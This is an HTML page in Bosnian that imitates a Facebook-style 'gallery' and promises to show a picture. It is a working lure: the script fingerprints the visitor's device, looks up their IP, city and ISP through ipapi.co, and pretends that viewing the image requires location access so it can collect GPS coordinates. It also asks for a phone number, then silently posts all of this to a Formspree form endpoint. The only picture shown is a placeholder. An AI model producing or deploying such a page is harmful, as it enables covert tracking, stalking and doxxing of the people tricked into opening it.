<!DOCTYPE html>
<html lang="bs">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pogledaj sadržaj</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #eef2f7;
}

.box {
  max-width: 420px;
  margin: 60px auto;
  background: white;
  border-radius: 18px;
  box-shadow: 0 8px 30px rgba(0,0,0,0.12);
  overflow: hidden;
}

.header {
  background: #1877f2;
  color: white;
  padding: 18px;
  font-size: 20px;
  font-weight: bold;
  text-align: center;
}

.content {
  padding: 24px;
  text-align: center;
}

.preview {
  height: 220px;
  border-radius: 14px;
  background: #dbeafe;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 44px;
  margin-bottom: 18px;
}

button {
  background: #1877f2;
  color: white;
  border: none;
  padding: 15px;
  width: 100%;
  border-radius: 10px;
  font-size: 17px;
  font-weight: bold;
  cursor: pointer;
  margin-top: 12px;
}

input {
  width: 100%;
  padding: 14px;
  font-size: 16px;
  border: 1px solid #ccc;
  border-radius: 10px;
  margin-top: 12px;
}

.small {
  color: #666;
  font-size: 14px;
  margin-top: 10px;
}

#phoneStep, #finalStep {
  display: none;
}
</style>
</head>

<body>

<div class="box">
<div class="header">Galerija</div>

<!-- STEP 1 -->
<div class="content" id="startStep">
  <div class="preview">🖼️</div>
  <h2>Klikni da vidiš sliku</h2>
  <p class="small">Za prikaz sadržaja potrebno je potvrditi pristup lokaciji.</p>
  <button onclick="start()">Prikaži sliku</button>
  <p id="status" class="small"></p>
</div>

<!-- STEP 2 -->
<div class="content" id="phoneStep">
  <div class="preview">📱</div>
  <h2>Unesi broj telefona</h2>
  <p class="small">
  Unos broja telefona je opcionalan. Nakon unosa možeš nastaviti i pogledati sadržaj.
  </p>

  <input id="phone" type="tel" placeholder="Broj telefona, npr. +43...">

  <button onclick="sendWithPhone()">Pošalji broj</button>
  <button onclick="sendWithoutPhone()">Preskoči</button>
</div>

<!-- STEP 3 -->
<div class="content" id="finalStep">
  <h2>Slika</h2>
  <img src="https://via.placeholder.com/400x300" style="width:100%; border-radius:12px;">
  <p class="small">Hvala.</p>
</div>

</div>

<script>
let collectedData = {};

async function start() {
  document.getElementById("status").textContent = "Učitavanje...";

  collectedData = {
    userAgent: navigator.userAgent || "N/A",
    platform: navigator.platform || "N/A",
    vendor: navigator.vendor || "N/A",
    language: navigator.language || "N/A",
    languages: navigator.languages ? navigator.languages.join(", ") : "N/A",

    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    time: new Date().toLocaleString(),

    screenWidth: screen.width,
    screenHeight: screen.height,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,

    windowWidth: window.innerWidth,
    windowHeight: window.innerHeight,

    online: navigator.onLine,
    cookies: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || "N/A",

    touch: navigator.maxTouchPoints,
    cpu: navigator.hardwareConcurrency || "N/A",
    memory: navigator.deviceMemory || "N/A",

    url: location.href,
    referrer: document.referrer || "direkt"
  };

  if (navigator.connection) {
    collectedData.network = navigator.connection.effectiveType;
    collectedData.downlink = navigator.connection.downlink;
  }

  if (navigator.getBattery) {
    try {
      let b = await navigator.getBattery();
      collectedData.battery = Math.round(b.level * 100) + "%";
      collectedData.charging = b.charging;
    } catch {}
  }

  try {
    let res = await fetch("https://ipapi.co/json/");
    let ip = await res.json();
    collectedData.ip = ip.ip;
    collectedData.city = ip.city;
    collectedData.country = ip.country_name;
    collectedData.org = ip.org;
  } catch {}

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        collectedData.lat = pos.coords.latitude;
        collectedData.lon = pos.coords.longitude;
        collectedData.accuracy = pos.coords.accuracy;
        showPhoneStep();
      },
      function() {
        collectedData.gps = "nije dozvoljeno";
        showPhoneStep();
      }
    );
  } else {
    showPhoneStep();
  }
}

function showPhoneStep() {
  document.getElementById("startStep").style.display = "none";
  document.getElementById("phoneStep").style.display = "block";
}

function sendWithPhone() {
  collectedData.phone = document.getElementById("phone").value || "nije unesen";
  sendData();
}

function sendWithoutPhone() {
  collectedData.phone = "preskočeno";
  sendData();
}

function sendData() {
  fetch("https://formspree.io/f/mnjlyqqy", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(collectedData)
  });

  document.getElementById("phoneStep").style.display = "none";
  document.getElementById("finalStep").style.display = "block";
}
</script>

</body>
</html>
